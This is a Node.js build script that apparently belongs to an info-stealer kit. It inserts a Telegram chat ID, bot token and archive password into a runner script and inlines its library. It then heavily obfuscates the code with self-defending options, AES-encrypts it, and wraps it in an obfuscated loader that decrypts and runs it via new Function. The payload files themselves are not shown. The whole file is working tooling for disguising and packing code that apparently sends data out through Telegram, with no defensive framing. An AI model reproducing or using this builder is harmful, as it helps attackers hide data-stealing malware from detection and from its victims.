const fs = require('fs')
const path = require('path')
const crypto = require('crypto')

const JavaScriptObfuscator = require('javascript-obfuscator')

const argv = process.argv.slice(2)

const helpMsg = 'Usage: node builder.js <chat_id> <token>'
if (argv[0] === '--help' || argv[0] === '-h') {
  console.log(helpMsg)
  return
}
if (argv.length < 2) {
  console.error(`Error: Pass the Telegram chat ID and token as arguments\n${helpMsg}`)
  return
}

const libPath = path.join(__dirname, 'lib.js')
const runnerPath = path.join(__dirname, 'runner.js')

const outputDir = path.join(__dirname, 'obfuscated')
const outputRunnerPath = path.join(outputDir, 'runner.js')

let libCode = fs.readFileSync(libPath, 'utf8')
let runnerCode = fs.readFileSync(runnerPath, 'utf8')

const chatId = argv[0]
const token = argv[1]
const archivePassword = argv[2] || ''

const obfuscationOptions = {
  compact: true,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 1,
  deadCodeInjection: true,
  deadCodeInjectionThreshold: 1,
  identifierNamesGenerator: 'hexadecimal',
  renameGlobals: true,
  selfDefending: true,
  splitStrings: true,
  splitStringsChunkLength: 2,
  stringArray: true,
  // stringArrayEncoding: ['base64'], // makes it crash when packed with pkg
  stringArrayThreshold: 0.9,
  target: 'node',
  transformObjectKeys: true,
  ignoreImports: true,
  // disableConsoleOutput: true,
  numbersToExpressions: true,
  stringArrayCallsTransform: true,
  stringArrayRotate: true,
  stringArrayShuffle: true,
  stringArrayWrappersCount: 5,
  stringArrayWrappersChainedCalls: true,
  stringArrayWrappersParametersMaxCount: 5,
  stringArrayWrappersType: 'function',
  unicodeEscapeSequence: true
}

/**
 * Encrypts text by given key
 * @param String text to encrypt
 * @param Buffer masterkey
 * @returns String encrypted text, base64 encoded
 * @see https://gist.github.com/rigwild/a4f4cf1527bc044dbbc92f37f727484e
 */
function encrypt(text, masterkey) {
  // random initialization vector
  const iv = crypto.randomBytes(16)

  // random salt
  const salt = crypto.randomBytes(64)

  // derive encryption key: 32 byte key length
  // in assumption the masterkey is a cryptographic and NOT a password there is no need for
  // a large number of iterations. It may can replaced by HKDF
  // the value of 2145 is randomly chosen!
  const key = crypto.pbkdf2Sync(masterkey, salt, 2145, 32, 'sha512')

  // AES 256 GCM Mode
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)

  // encrypt the given text
  const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()])

  // extract the auth tag
  const tag = cipher.getAuthTag()

  // generate output
  return Buffer.concat([salt, iv, tag, encrypted]).toString('base64')
}

/**
 * Decrypts text by given key
 * @param String base64 encoded input data
 * @param Buffer masterkey
 * @returns String decrypted (original) text
 * @see https://gist.github.com/rigwild/a4f4cf1527bc044dbbc92f37f727484e
 */
function decrypt(encdata, masterkey) {
  // base64 decoding
  const bData = Buffer.from(encdata, 'base64')

  // convert data to buffers
  const salt = bData.slice(0, 64)
  const iv = bData.slice(64, 80)
  const tag = bData.slice(80, 96)
  const text = bData.slice(96)

  // derive key using; 32 byte key length
  const key = crypto.pbkdf2Sync(masterkey, salt, 2145, 32, 'sha512')

  // AES 256 GCM Mode
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)
  decipher.setAuthTag(tag)

  // encrypt the given text
  const decrypted = decipher.update(text, 'binary', 'utf8') + decipher.final('utf8')

  return decrypted
}

// Get a random encryption secret key
const secret = [...Array(50)].map(() => Math.random().toString(36)[2]).join('')
const key = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32)

runnerCode = runnerCode.replace(/telegramChatId.*/g, `telegramChatId: '${chatId}',`)
runnerCode = runnerCode.replace(/telegramToken.*/g, `telegramToken: '${token}',`)
runnerCode = runnerCode.replace(/archivePassword.*/g, `archivePassword: '${archivePassword}'`)
// Replace require lib with lib code
runnerCode = runnerCode.replace(/const \{ run \} = require\('\.\/lib'\)/g, libCode)
runnerCode = runnerCode.replace(/module.exports = { run }/g, '')
// console.log('Runner code (clear text):\n```')
// console.log(runnerCode)
// console.log('```')
// Obfuscate internal code
runnerCode = JavaScriptObfuscator.obfuscate(runnerCode, obfuscationOptions).getObfuscatedCode()

const encrypted = encrypt(runnerCode, key)
runnerCode = `
const crypto = require('crypto')
${decrypt.toString()}
const decrypted = decrypt(\`${encrypted}\`, '${key}')
new Function('require', decrypted)(require)
`
// Obfuscate loader decryption code
runnerCode = JavaScriptObfuscator.obfuscate(runnerCode, obfuscationOptions).getObfuscatedCode()

// console.log('#############\n\nRunner code encrypted:\n```')
// console.log(runnerCode)
// console.log('```')

fs.writeFileSync(outputRunnerPath, runnerCode, 'utf8')

console.log(`Obfuscated files saved to ${outputDir}`)
